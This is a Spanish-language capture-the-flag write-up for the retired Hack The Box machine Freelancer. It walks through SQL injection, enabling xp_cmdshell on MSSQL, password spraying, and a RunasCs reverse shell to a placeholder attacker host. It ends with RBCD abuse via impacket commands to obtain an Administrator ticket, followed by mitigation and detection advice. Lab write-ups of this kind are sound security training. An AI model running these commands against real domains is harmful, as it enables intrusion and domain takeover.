---
machine: Freelancer
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, web, sqli, mssql, rbcd, privesc]
---

# Freelancer — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

El sitio de empleo tiene un SQLi que entrega credenciales de `sql_svc`; con MSSQL y `xp_cmdshell` se obtiene shell. Un spray de contraseñas llega a `mikasaAckerman`, y `RunasCs` permite usar credenciales de `lorra199`. El análisis de un dump y un nuevo spray llevan a una cuenta con derechos para configurar RBCD, lo que permite obtener un ticket de Administrator y entrar por WinRM.

## Reconocimiento

```bash
nmap -Pn -sCV -p80,445,1433,5985 <IP>
```

- `80` IIS con el sitio de freelancers, `445` SMB, `1433` MSSQL y `5985` WinRM.
- `ffuf` con `Host: FUZZ.freelancer.htb` encuentra el portal de empleadores.
- SMB permite listar shares con credenciales nulas o invitadas.

## Enumeración

- El portal de empleadores tiene un login vulnerable a SQLi.
- La inyección devuelve credenciales de `sql_svc` y acceso a la base.
- `sql_svc` tiene permisos para ejecutar `xp_cmdshell`.

## Foothold

Se habilita `xp_cmdshell` y se ejecuta una reverse shell como `sql_svc`.

```bash
impacket-mssqlclient sql_svc:'<PASSWORD>'@<IP> -windows-auth
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'powershell -c ...';
```

## Movimiento lateral

Un spray con las contraseñas encontradas valida `mikasaAckerman`; `RunasCs` permite ejecutar procesos con esas credenciales y llegar a `lorra199`. Un dump local y un nuevo spray identifican una cuenta con permisos de escritura en un objeto de equipo.

```cmd
RunasCs.exe mikasaAckerman <PASSWORD> cmd.exe -r <ATTACKER>:443
```

## Escalada de privilegios

Con esa cuenta se configura RBCD sobre un equipo controlado, se pide un ticket de servicio para Administrator y se usa `PassTheTicket` para entrar por WinRM.

```bash
impacket-rbcd -delegate-from '<USER>' -delegate-to 'DC$' -action write 'freelancer.htb/<USER>:<PASSWORD>'
impacket-getST -spn cifs/dc.freelancer.htb -impersonate Administrator 'freelancer.htb/<USER>:<PASSWORD>'
```

## Evidencia

- SQLi en el portal de empleadores y credenciales de `sql_svc`.
- `xp_cmdshell` y shell inicial.
- Spray, `RunasCs` y credenciales de `lorra199`.
- RBCD y ticket de Administrator.

## Lecciones aprendidas

- Un SQLi en un portal de negocio puede acabar en ejecución de sistema.
- La reutilización de contraseñas permite escalar entre cuentas de servicio.
- RBCD sobre un equipo con derechos de escritura lleva a Domain Admin.

## Mitigación y detección

- Parametrizar las consultas y restringir `xp_cmdshell`.
- Usar contraseñas únicas y LAPS para cuentas locales.
- Auditar `msDS-AllowedToActOnBehalfOfOtherIdentity` y el uso de RBCD.

## Referencias

- [0xdf — Freelancer](https://0xdf.gitlab.io/2024/10/05/htb-freelancer.html)
- [IppSec — Freelancer](https://www.youtube.com/watch?v=NcicYfFofS4)
- [Hack The Box — Freelancer](https://app.hackthebox.com/machines/freelancer)
